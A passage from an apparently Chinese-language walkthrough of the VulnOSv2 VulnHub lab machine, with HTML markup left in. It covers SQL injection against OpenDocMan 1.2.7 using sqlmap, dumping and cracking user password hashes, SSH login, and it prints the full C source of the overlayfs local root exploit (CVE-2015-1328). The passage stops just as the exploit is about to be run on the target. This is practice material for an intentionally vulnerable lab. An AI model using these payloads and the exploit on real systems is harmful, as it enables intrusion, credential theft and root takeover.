http://192.168.56.104:80/jabc/misc/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">6667/tcp open  irc     ngircd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait <span class="built_in">set</span> to 100 (or higher <span class="keyword">if</span> you get this message again).</span><br></pre></td></tr></table></figure>

<p>浏览器访问80端口的website链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104/jabc/</span><br></pre></td></tr></table></figure>

<p>在此网页中，有许多选项卡，浏览了每个选项卡，包括其页面来源，除了最后一个选项卡（文档）之外，什么也没找到。</p>
<p>当查看页面源代码时，服务器上将显示一行“/jabd0cs/”。只需用guest/guest登录即可</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub267.jpg"></li>
</ul>
<p>因此，打开目录并使用guest：guest作为用户名：password登录。</p>
<p>并且有一个上载选项，但有一个限制，即只能上载.doc文件，因此它几乎没有用。</p>
<p>如果观察登录页面，则有一个cms OpenDocMan v1.2.7。此版本的opendocman容易受到攻击。</p>
<p>搜索一下可用于opendocman的漏洞利用方法。对于这种类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit OpenDocMan 1.2.7</span></span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">                                                                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">OpenDocMan 1.2.7 - Multiple Vulnerabilities                                         | exploits/php/webapps/32075.txt</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p>从其结果中，发现了利用32075.txt的漏洞，该漏洞显示“由于对“/ajax_udf.php”脚本中的“add_value” HTTP GET参数的验证不足而存在该漏洞。远程未经身份验证的攻击者可以在应用程序的数据库中执行任意SQL命令。”</p>
<p>现在查看一下exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/32075.txt</span></span><br><span class="line">Advisory ID: HTB23202</span><br><span class="line">Product: OpenDocMan</span><br><span class="line">Vendor: Free Document Management Software</span><br><span class="line">Vulnerable Version(s): 1.2.7 and probably prior</span><br><span class="line">Tested Version: 1.2.7</span><br><span class="line">Advisory Publication: February 12, 2014 [without technical details]</span><br><span class="line">Vendor Notification: February 12, 2014</span><br><span class="line">Vendor Patch: February 24, 2014</span><br><span class="line">Public Disclosure: March 5, 2014</span><br><span class="line">Vulnerability Type: SQL Injection [CWE-89], Improper Access Control [CWE-284]</span><br><span class="line">CVE References: CVE-2014-1945, CVE-2014-1946</span><br><span class="line">Risk Level: High</span><br><span class="line">CVSSv2 Base Scores: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P), 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)</span><br><span class="line">Solution Status: Fixed by Vendor</span><br><span class="line">Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Advisory Details:</span><br><span class="line">                                                                                                                             </span><br><span class="line">High-Tech Bridge Security Research Lab discovered multiple vulnerabilities <span class="keyword">in</span> OpenDocMan, <span class="built_in">which</span> can be exploited to perform SQL Injection and gain administrative access to the application.                                                              </span><br><span class="line"></span><br><span class="line">1) SQL Injection <span class="keyword">in</span> OpenDocMan: CVE-2014-1945</span><br><span class="line"></span><br><span class="line">The vulnerability exists due to insufficient validation of <span class="string">&quot;add_value&quot;</span> HTTP GET parameter <span class="keyword">in</span> <span class="string">&quot;/ajax_udf.php&quot;</span> script. A remote unauthenticated attacker can execute arbitrary SQL commands <span class="keyword">in</span> application<span class="string">&#x27;s database.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The exploitation example below displays version of the MySQL server:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://[host]/ajax_udf.php?q=1&amp;add_value=odm_user%20UNION%20SELECT%201,v</span></span><br><span class="line"><span class="string">ersion%28%29,3,4,5,6,7,8,9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2) Improper Access Control in OpenDocMan: CVE-2014-1946</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The vulnerability exists due to insufficient validation of allowed action in &quot;/signup.php&quot; script when updating userâ??s profile. A remote authenticated attacker can assign administrative privileges to the current account and gain complete control over the application.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The exploitation example below assigns administrative privileges for the current account:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;form action=&quot;http://[host]/signup.php&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;updateuser&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;admin&quot; value=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;[USER_ID]&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; name=&quot;login&quot; value=&quot;Run&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Solution:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Update to OpenDocMan v1.2.7.2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">More Information:</span></span><br><span class="line"><span class="string">http://www.opendocman.com/opendocman-v1-2-7-1-release/</span></span><br><span class="line"><span class="string">http://www.opendocman.com/opendocman-v1-2-7-2-released/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">-----------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">References:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[1] High-Tech Bridge Advisory HTB23202 - https://www.htbridge.com/advisory/HTB23202 - Multiple vulnerabilities in OpenDocMan.</span></span><br><span class="line"><span class="string">[2] OpenDocMan - http://www.opendocman.com/ - Open Source Document Management System written in PHP.</span></span><br><span class="line"><span class="string">[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVEÂ® is a dictionary of publicly known information security vulnerabilities and exposures.</span></span><br><span class="line"><span class="string">[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.</span></span><br><span class="line"><span class="string">[5] ImmuniWebÂ® - http://www.htbridge.com/immuniweb/ - is High-Tech Bridge&#x27;</span>s proprietary web application security assessment solution with SaaS delivery model that combines manual and automated vulnerability testing.</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">Disclaimer: The information provided <span class="keyword">in</span> this Advisory is provided <span class="string">&quot;as is&quot;</span> and without any warranty of any kind. Details of this Advisory may be updated <span class="keyword">in</span> order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] <span class="keyword">in</span> the References.</span><br></pre></td></tr></table></figure>

<p>现在，使用sqlmap来查找用户名和密码的数据库，像下面这样：</p>
<p>该操作使用了burp中与sqlmap联动的插件，右键可以直接注入</p>
<ul>
<li>跑库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 --dbs</span><br><span class="line">available databases [6]:</span><br><span class="line">[*] drupal7</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] jabcd0cs</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] phpmyadmin</span><br></pre></td></tr></table></figure>

<ul>
<li>跑表</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs --tables</span><br><span class="line">Database: jabcd0cs</span><br><span class="line">[15 tables]</span><br><span class="line">+-------------------+</span><br><span class="line">| odm_access_log    |</span><br><span class="line">| odm_admin         |</span><br><span class="line">| odm_category      |</span><br><span class="line">| odm_data          |</span><br><span class="line">| odm_department    |</span><br><span class="line">| odm_dept_perms    |</span><br><span class="line">| odm_dept_reviewer |</span><br><span class="line">| odm_filetypes     |</span><br><span class="line">| odm_log           |</span><br><span class="line">| odm_odmsys        |</span><br><span class="line">| odm_rights        |</span><br><span class="line">| odm_settings      |</span><br><span class="line">| odm_udf           |</span><br><span class="line">| odm_user          |</span><br><span class="line">| odm_user_perms    |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>跑用户名和密码的hash值</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D:\burpcn2.0\BurpSuite_pro_v2.1\BurpSuite_pro_v2.1&gt;sqlmap.py -r C:\Users\HASEE\AppData\Local\Temp\\1587350985142.req --level 5 --risk 3 -D jabcd0cs -T odm_user --dump</span><br><span class="line">Database: jabcd0cs</span><br><span class="line">Table: odm_user</span><br><span class="line">[2 entries]</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br><span class="line">| id   | phone       | Email              | username | last_name | first_name | password                                 | department | pw_reset_code |</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br><span class="line">| 1    | 5555551212  | webmin@example.com | webmin   | min       | web        | b78aae356709f8c31118ea613980954b         | 2          | &lt;blank&gt;       |</span><br><span class="line">| 2    | 555 5555555 | guest@example.com  | guest    | guest     | guest      | 084e0343a0486ff05530df6c705c8bb4 (guest) | 2          | NULL          |</span><br><span class="line">+------+-------------+--------------------+----------+-----------+------------+------------------------------------------+------------+---------------+</span><br></pre></td></tr></table></figure>

<p>使用在线解密工具破解一下webmin的hash值</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub268.jpg"></li>
</ul>
<p>webmin/webmin1980</p>
<p>密码为webmin1980，用户名为webmin。通过SSH端口登录。在kali中打开一个新终端，然后键入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh webmin@192.168.56.104</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.104 (192.168.56.104)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:nIyyJRPJMy1g6F5m8AIT7W//x6lj3ZqhUbYuvSafKeI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.104<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">webmin@192.168.56.104&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 14.04.4 LTS (GNU/Linux 3.13.0-24-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Mon Apr 20 04:13:19 CEST 2020</span><br><span class="line"></span><br><span class="line">  System load: 0.15              Memory usage: 2%   Processes:       57</span><br><span class="line">  Usage of /:  5.7% of 29.91GB   Swap usage:   0%   Users logged <span class="keyword">in</span>: 0</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">Last login: Wed May  4 10:41:07 2016</span><br><span class="line">$ id</span><br><span class="line">uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)</span><br><span class="line">$ whoami</span><br><span class="line">webmin</span><br><span class="line">$ uname -a</span><br><span class="line">Linux VulnOSv2 3.13.0-24-generic <span class="comment">#47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>检查内核的版本，看看它是否容易受到攻击。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 14.04.4 LTS</span><br><span class="line">Release:        14.04</span><br><span class="line">Codename:       trusty</span><br></pre></td></tr></table></figure>

<p>版本是14.04，表示可以被利用，并且适用于该类型：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 14.04</span></span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                                                                      |  Path</span><br><span class="line">                                                                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------ ----------------------------------------</span><br><span class="line">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation             | exploits/linux/<span class="built_in">local</span>/37088.c</span><br><span class="line">Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                         | exploits/linux/<span class="built_in">local</span>/36782.sh</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / Ce | exploits/linux_x86-64/<span class="built_in">local</span>/42275.c</span><br><span class="line">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - <span class="string">&#x27;ldso | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 14.04.3) - &#x27;</span>perf_event_open()<span class="string">&#x27; Can Race with execve() (Access  | exploits/linux/local/39771.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local Pri | exploits/linux/local/37292.c</span></span><br><span class="line"><span class="string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="string">&#x27; Local Pri | exploits/linux/local/37293.txt</span></span><br><span class="line"><span class="string">Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP | exploits/linux/local/41999.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - &#x27;</span>overlayfs<span class="string">&#x27; Local Privilege Escalation (1 | exploits/linux/local/39166.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Condition Privile | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - &#x27;</span>AF_PACKET<span class="string">&#x27; Race Con | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalat | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Loc | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                    | exploits/linux/dos/37777.txt</span></span><br><span class="line"><span class="string">Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation     | exploits/linux/local/41762.txt</span></span><br><span class="line"><span class="string">WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                         | exploits/linux/local/44204.md</span></span><br><span class="line"><span class="string">usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation           | exploits/linux/local/36820.txt</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------ ----------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>列出了许多可以利用的漏洞，从其中选择37292.c作为overlayfs的“本地提权”。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - <span class="string">&#x27;overlayfs&#x27;</span> Local Pri | exploits/linux/<span class="built_in">local</span>/37292.c</span><br></pre></td></tr></table></figure>

<p>查看exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/37292.c</span></span><br><span class="line">/*</span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"></span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ uname -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ id</span><br><span class="line">uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br><span class="line">%rebel%</span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LIB &quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><span class="line"></span><br><span class="line">static char child_stack[1024*1024];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(<span class="string">&quot;rm -rf /tmp/ns_sploit&quot;</span>);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/work&quot;</span>, 0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/upper&quot;</span>,0777);</span><br><span class="line">    mkdir(<span class="string">&quot;/tmp/ns_sploit/o&quot;</span>,0777);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,<span class="string">&quot;mount #1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;overlay&quot;</span>, <span class="string">&quot;/tmp/ns_sploit/o&quot;</span>, <span class="string">&quot;overlayfs&quot;</span>, MS_MGC_VAL, <span class="string">&quot;lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper&quot;</span>) != 0) &#123;</span><br><span class="line">// workdir= and <span class="string">&quot;overlay&quot;</span> is needed on newer kernels, also can<span class="string">&#x27;t use /proc as lower</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;no FS_USERNS_MOUNT for overlayfs on this kernel\n&quot;);</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        file = &quot;.access&quot;;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125; else file = &quot;ns_last_pid&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    rename(file,&quot;ld.so.preload&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir(&quot;/&quot;);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;mount #2\n&quot;);</span></span><br><span class="line"><span class="string">    if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlayfs&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">        if (mount(&quot;overlay&quot;, &quot;/tmp/ns_sploit/o&quot;, &quot;overlay&quot;, MS_MGC_VAL, &quot;lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work&quot;) != 0) &#123;</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        chmod(&quot;/tmp/ns_sploit/work/work&quot;,0777);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/ns_sploit/o/ld.so.preload&quot;,0777);</span></span><br><span class="line"><span class="string">    umount(&quot;/tmp/ns_sploit/o&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int</span></span><br><span class="line"><span class="string">main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int status, fd, lib;</span></span><br><span class="line"><span class="string">    pid_t wrapper, init;</span></span><br><span class="line"><span class="string">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;spawning threads\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if((wrapper = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">        if(unshare(CLONE_NEWUSER) != 0)</span></span><br><span class="line"><span class="string">            fprintf(stderr, &quot;failed to create new user namespace\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if((init = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">            pid_t pid =</span></span><br><span class="line"><span class="string">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span></span><br><span class="line"><span class="string">            if(pid &lt; 0) &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;failed to create new mount namespace\n&quot;);</span></span><br><span class="line"><span class="string">                exit(-1);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        waitpid(init, &amp;status, 0);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    usleep(300000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    wait(NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;child threads done\n&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fd = open(&quot;/etc/ld.so.preload&quot;,O_WRONLY);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(fd == -1) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;exploit failed\n&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;/etc/ld.so.preload created\n&quot;);</span></span><br><span class="line"><span class="string">    fprintf(stderr,&quot;creating shared library\n&quot;);</span></span><br><span class="line"><span class="string">    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);</span></span><br><span class="line"><span class="string">    write(lib,LIB,strlen(LIB));</span></span><br><span class="line"><span class="string">    close(lib);</span></span><br><span class="line"><span class="string">    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);</span></span><br><span class="line"><span class="string">    if(lib != 0) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,&quot;couldn&#x27;</span>t create dynamic library\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    write(fd,&quot;</span>/tmp/ofs-lib.so\n<span class="string">&quot;,16);</span></span><br><span class="line"><span class="string">    close(fd);</span></span><br><span class="line"><span class="string">    system(&quot;</span>rm -rf /tmp/ns_sploit /tmp/ofs-lib.c<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    execl(&quot;</span>/bin/su<span class="string">&quot;,&quot;</span>su<span class="string">&quot;,NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将exploit拷贝一份过来然后传输到目标机器上编译并运行</p>
